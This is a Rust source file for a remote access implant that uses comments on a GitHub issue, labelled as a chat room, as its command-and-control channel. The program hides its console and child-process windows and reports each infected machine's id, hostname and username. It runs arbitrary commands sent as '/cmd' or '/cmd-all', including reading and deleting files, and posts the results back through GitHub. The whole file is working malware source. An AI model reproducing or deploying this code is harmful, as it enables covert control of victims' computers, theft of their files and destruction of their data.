#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use chrono::{DateTime, Utc};
use octocrab::models::issues::Issue;
use octocrab::{Octocrab, params};
use std::collections::HashMap;
use std::env;
use std::fs;
use std::io::{self, BufRead};
use std::sync::Arc;
use std::thread;
use tokio::sync::mpsc;
use tokio::time::{Duration, sleep};
use uuid::Uuid;
use whoami::fallible;

const GITHUB_TOKEN: &str = "--YOUR-GITHUB-TOKEN-HERE--";
const REPO_LINK: &str = "--YOUR-GITHUB-REPO-HERE--";
const ROOM_TITLE: &str = "[chat-room] global";
const POLL_INTERVAL_SECS: u64 = 2;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let octocrab = Octocrab::builder()
        .personal_token(GITHUB_TOKEN.to_string())
        .build()?;
    let octocrab = Arc::new(octocrab);

    let owner_repo = parse_owner_repo(REPO_LINK)?;
    let (owner, repo) = owner_repo.split_once('/').expect("invalid owner/repo");
    let owner = owner.to_string();
    let repo = repo.to_string();

    let issue = get_or_create_room_issue(&octocrab, &owner, &repo, ROOM_TITLE).await?;
    let issue_number = issue.number;
    let agent_id = Uuid::new_v4().to_string();
    let hostname = get_hostname();
    let username = get_username();

    let initial_comments = octocrab
        .issues(&owner, &repo)
        .list_comments(issue_number)
        .per_page(100)
        .send()
        .await?;
    let initial_max: Option<DateTime<Utc>> = initial_comments
        .items
        .iter()
        .map(|c| c.created_at.clone())
        .max();
    let last_seen = tokio::sync::Mutex::new(initial_max);

    let interact_map = Arc::new(tokio::sync::Mutex::new(HashMap::<String, String>::new()));

    let poll_oct = octocrab.clone();
    let poll_owner = owner.clone();
    let poll_repo = repo.clone();
    let self_agent = agent_id.clone();
    let self_host = hostname.clone();
    let self_user = username.clone();
    let interact_poll = interact_map.clone();
    let poll_handle = tokio::spawn(async move {
        loop {
            if let Ok(page) = poll_oct
                .issues(&poll_owner, &poll_repo)
                .list_comments(issue_number)
                .per_page(100)
                .send()
                .await
            {
                let mut guard = last_seen.lock().await;
                let prev = *guard;
                let mut new_comments: Vec<_> = match prev {
                    Some(p) => page.items.iter().filter(|c| c.created_at > p).collect(),
                    None => page.items.iter().collect(),
                };
                new_comments.sort_by_key(|c| c.created_at.clone());
                for c in new_comments {
                    let body = c.body.as_deref().unwrap_or("").trim().to_string();
                    if !body.starts_with('/') {
                        continue;
                    }
                    let author = c.user.login.clone();
                    let resp_opt = match_command(
                        &body,
                        &author,
                        &self_agent,
                        &self_host,
                        &self_user,
                        &interact_poll,
                    )
                    .await;
                    if let Some(resp) = resp_opt {
                        let jitter_ms = compute_jitter(&self_agent);
                        sleep(Duration::from_millis(jitter_ms)).await;
                        let _ = poll_oct
                            .issues(&poll_owner, &poll_repo)
                            .create_comment(issue_number, resp)
                            .await;
                    }
                }
                if let Some(m) = page.items.iter().map(|c| c.created_at.clone()).max() {
                    *guard = Some(m);
                } else if guard.is_none() {
                    *guard = prev;
                }
            }
            sleep(Duration::from_secs(POLL_INTERVAL_SECS)).await;
        }
    });

    let (tx, mut rx) = mpsc::unbounded_channel::<String>();
    let tx_block = tx.clone();
    thread::spawn(move || {
        let stdin = io::stdin();
        for line in stdin.lock().lines() {
            match line {
                Ok(l) => {
                    let s = l.trim().to_string();
                    if s.is_empty() {
                        continue;
                    }
                    let _ = tx_block.send(s);
                }
                Err(_) => break,
            }
        }
    });

    let post_oct = octocrab.clone();
    let post_owner = owner.clone();
    let post_repo = repo.clone();
    let post_handle = tokio::spawn(async move {
        while let Some(line) = rx.recv().await {
            let _ = post_oct
                .issues(&post_owner, &post_repo)
                .create_comment(issue_number, line)
                .await;
        }
    });

    tokio::signal::ctrl_c().await?;
    poll_handle.abort();
    post_handle.abort();
    let _ = poll_handle.await;
    let _ = post_handle.await;
    Ok(())
}

async fn match_command(
    body: &str,
    author: &str,
    self_agent: &str,
    host: &str,
    user: &str,
    interact_lock: &tokio::sync::Mutex<HashMap<String, String>>,
) -> Option<String> {
    let parts: Vec<&str> = body.split_whitespace().collect();
    if parts.is_empty() {
        return None;
    }
    match parts[0] {
        "/ls" => Some(format!("{} {} {}", self_agent, host, user)),
        "/interact" => {
            if parts.len() < 2 {
                return None;
            }
            let target = parts[1];
            if target == self_agent {
                let mut imap = interact_lock.lock().await;
                imap.insert(author.to_string(), self_agent.to_string());
                return Some(format!("interacting with {}", self_agent));
            }
            None
        }
        "/cmd" => {
            if parts.len() < 2 {
                return None;
            }
            let imap = interact_lock.lock().await;
            let target = match imap.get(author) {
                Some(t) => t.clone(),
                None => return None,
            };
            if target != self_agent {
                return None;
            }
            let cmd = body.strip_prefix("/cmd").unwrap_or("").trim();
            let res = execute_command(cmd).await;
            Some(format!("result [{}]:\n{}", self_agent, res))
        }
        "/cmd-all" => {
            if parts.len() < 2 {
                return None;
            }
            let cmd = body.strip_prefix("/cmd-all").unwrap_or("").trim();
            let res = execute_command(cmd).await;
            Some(format!("result [{}]:\n{}", self_agent, res))
        }
        _ => None,
    }
}

async fn execute_command(cmd: &str) -> String {
    if cmd.is_empty() {
        return "empty command".to_string();
    }
    let mut parts = cmd.split_whitespace();
    match parts.next().unwrap_or("") {
        "pwd" => match env::current_dir() {
            Ok(p) => format!("{}", p.display()),
            Err(e) => format!("error: {}", e),
        },
        "cd" => {
            let target = parts.next().unwrap_or(".");
            match env::set_current_dir(target) {
                Ok(_) => "".to_string(),
                Err(e) => format!("error: {}", e),
            }
        }
        "ls" => match fs::read_dir(".") {
            Ok(it) => {
                let mut v = Vec::new();
                for e in it.flatten() {
                    if let Some(n) = e.file_name().to_str() {
                        v.push(n.to_string());
                    }
                }
                v.sort();
                if v.is_empty() {
                    "empty".to_string()
                } else {
                    v.join("\n")
                }
            }
            Err(e) => format!("error: {}", e),
        },
        "cat" | "type" => {
            if let Some(p) = parts.next() {
                match fs::read_to_string(p) {
                    Ok(s) => {
                        if s.ends_with('\n') {
                            s
                        } else {
                            format!("{}\n", s)
                        }
                    }
                    Err(e) => format!("error: {}", e),
                }
            } else {
                "usage: cat <file>".to_string()
            }
        }
        "mkdir" => {
            if let Some(p) = parts.next() {
                match fs::create_dir(p) {
                    Ok(_) => "".to_string(),
                    Err(e) => format!("error: {}", e),
                }
            } else {
                "usage: mkdir <dir>".to_string()
            }
        }
        "rmdir" => {
            if let Some(p) = parts.next() {
                match fs::remove_dir(p) {
                    Ok(_) => "".to_string(),
                    Err(e) => format!("error: {}", e),
                }
            } else {
                "usage: rmdir <dir>".to_string()
            }
        }
        "rm" => {
            if let Some(p) = parts.next() {
                match fs::remove_file(p) {
                    Ok(_) => "".to_string(),
                    Err(e) => format!("error: {}", e),
                }
            } else {
                "usage: rm <file>".to_string()
            }
        }
        "mv" => {
            let a: Vec<&str> = parts.collect();
            if a.len() == 2 {
                match fs::rename(a[0], a[1]) {
                    Ok(_) => "".to_string(),
                    Err(e) => format!("error: {}", e),
                }
            } else {
                "usage: mv <src> <dst>".to_string()
            }
        }
        "cp" => {
            let a: Vec<&str> = parts.collect();
            if a.len() == 2 {
                match fs::copy(a[0], a[1]) {
                    Ok(_) => "".to_string(),
                    Err(e) => format!("error: {}", e),
                }
            } else {
                "usage: cp <src> <dst>".to_string()
            }
        }
        "echo" => parts.collect::<Vec<&str>>().join(" "),
        "find" => {
            if let Some(pat) = parts.next() {
                let star = pat.find('*');
                match fs::read_dir(".") {
                    Ok(it) => {
                        let mut v = Vec::new();
                        for e in it.flatten() {
                            if let Some(n) = e.file_name().to_str() {
                                let m = if let Some(i) = star {
                                    let (pre, suf0) = pat.split_at(i);
                                    let suf = &suf0[1..];
                                    n.starts_with(pre) && n.ends_with(suf)
                                } else {
                                    n == pat
                                };
                                if m {
                                    v.push(n.to_string());
                                }
                            }
                        }
                        v.sort();
                        if v.is_empty() {
                            "empty".to_string()
                        } else {
                            v.join("\n")
                        }
                    }
                    Err(e) => format!("error: {}", e),
                }
            } else {
                "usage: find <pattern>".to_string()
            }
        }
        _ => {
            let parts = parse_cmdline(cmd);
            if parts.is_empty() {
                return String::new();
            }
            let prog = parts[0].clone();
            let args: Vec<String> = parts[1..].to_vec();
            run_external_command(&prog, &args).await
        }
    }
}

async fn run_external_command(cmd: &str, args: &[String]) -> String {
    use std::process::{Command, Stdio};
    use tokio::task;

    let cmd_owned = cmd.to_string();
    let args_owned: Vec<String> = args.iter().cloned().collect();

    let out = task::spawn_blocking(move || {
        let try_run = || -> Result<std::process::Output, std::io::Error> {
            let mut c = Command::new(&cmd_owned);
            for a in &args_owned {
                c.arg(a);
            }
            c.stdin(Stdio::null()).stdout(Stdio::piped()).stderr(Stdio::piped());

            #[cfg(target_os = "windows")]
            {
                use std::os::windows::process::CommandExt;
                const CREATE_NO_WINDOW: u32 = 0x08000000;
                c.creation_flags(CREATE_NO_WINDOW);
            }

            c.output()
        };

        match try_run() {
            Ok(output) => Ok(output),
            Err(e) => {
                let paths = std::env::var_os("PATH").unwrap_or_default();
                let mut tried = Vec::new();

                #[cfg(target_os = "windows")]
                let exts = std::env::var("PATHEXT").unwrap_or(".EXE;.BAT;.CMD".to_string());
                #[cfg(not(target_os = "windows"))]
                let exts = String::new();

                for p in std::env::split_paths(&paths) {
                    if exts.is_empty() {
                        let cand = p.join(&cmd_owned);
                        tried.push(cand.clone());
                        if cand.exists() {
                            let mut c2 = Command::new(cand);
                            for a in &args_owned {
                                c2.arg(a);
                            }
                            c2.stdin(Stdio::null()).stdout(Stdio::piped()).stderr(Stdio::piped());
                            #[cfg(target_os = "windows")]
                            {
                                use std::os::windows::process::CommandExt;
                                const CREATE_NO_WINDOW: u32 = 0x08000000;
                                c2.creation_flags(CREATE_NO_WINDOW);
                            }
                            return c2.output().map_err(|err| err);
                        }
                    } else {
                        for ext in exts.split(';') {
                            let cand = p.join(format!("{}{}", &cmd_owned, ext));
                            tried.push(cand.clone());
                            if cand.exists() {
                                let mut c2 = Command::new(cand);
                                for a in &args_owned {
                                    c2.arg(a);
                                }
                                c2.stdin(Stdio::null()).stdout(Stdio::piped()).stderr(Stdio::piped());
                                #[cfg(target_os = "windows")]
                                {
                                    use std::os::windows::process::CommandExt;
                                    const CREATE_NO_WINDOW: u32 = 0x08000000;
                                    c2.creation_flags(CREATE_NO_WINDOW);
                                }
                                return c2.output().map_err(|err| err);
                            }
                        }
                    }
                }
                Err(e)
            }
        }
    })
    .await;

    match out {
        Ok(Ok(output)) => {
            let mut s = String::new();
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            if !stdout.is_empty() {
                s.push_str(&stdout);
            }
            if !stderr.is_empty() {
                if !s.is_empty() {
                    s.push_str("\n");
                }
                s.push_str(&stderr);
            }
            if s.is_empty() {
                let code = output.status.code().unwrap_or(0);
                format!("exit code: {}", code)
            } else {
                s
            }
        }
        Ok(Err(e)) => format!("error: {}", e),
        Err(e) => format!("task join error: {}", e),
    }
}

fn parse_cmdline(s: &str) -> Vec<String> {
    let mut v = Vec::new();
    let mut b = String::new();
    let mut q = false;
    let mut qc = '\0';
    for c in s.chars() {
        if q {
            if c == qc {
                q = false;
            } else {
                b.push(c);
            }
        } else {
            match c {
                '"' | '\'' => {
                    q = true;
                    qc = c;
                }
                ' ' | '\t' => {
                    if !b.is_empty() {
                        v.push(b.clone());
                        b.clear();
                    }
                }
                _ => b.push(c),
            }
        }
    }
    if !b.is_empty() {
        v.push(b);
    }
    v
}


fn compute_jitter(agent: &str) -> u64 {
    let sum: u64 = agent.as_bytes().iter().map(|&b| b as u64).sum();
    (sum % 300) + 50
}

fn get_username() -> String {
    whoami::username()
}

fn get_hostname() -> String {
    fallible::hostname().unwrap_or_else(|_| "unknown-host".into())
}

fn parse_owner_repo(repo_link: &str) -> Result<String, Box<dyn std::error::Error + Send + Sync>> {
    if repo_link.contains("github.com") {
        let parts: Vec<&str> = repo_link.split('/').filter(|s| !s.is_empty()).collect();
        if let Some(pos) = parts.iter().position(|&s| s == "github.com") {
            if parts.len() > pos + 2 {
                return Ok(format!("{}/{}", parts[pos + 1], parts[pos + 2]));
            }
        }
        Err("could not parse owner/repo from URL".into())
    } else if repo_link.contains('/') {
        Ok(repo_link.to_string())
    } else {
        Err("REPO must be 'owner/repo' or 'https://github.com/owner/repo'".into())
    }
}

async fn get_or_create_room_issue(
    octocrab: &Octocrab,
    owner: &str,
    repo: &str,
    title: &str,
) -> octocrab::Result<Issue> {
    let issues_page = octocrab
        .issues(owner, repo)
        .list()
        .state(params::State::Open)
        .per_page(100)
        .send()
        .await?;
    for issue in &issues_page.items {
        if issue.title == title {
            return Ok(issue.clone());
        }
    }
    let body = format!(
        "Realtime chat via issue comments.\nRoom: {}\nDo not close this issue if you want the chat to continue.",
        title
    );
    octocrab
        .issues(owner, repo)
        .create(title)
        .body(&body)
        .send()
        .await
}
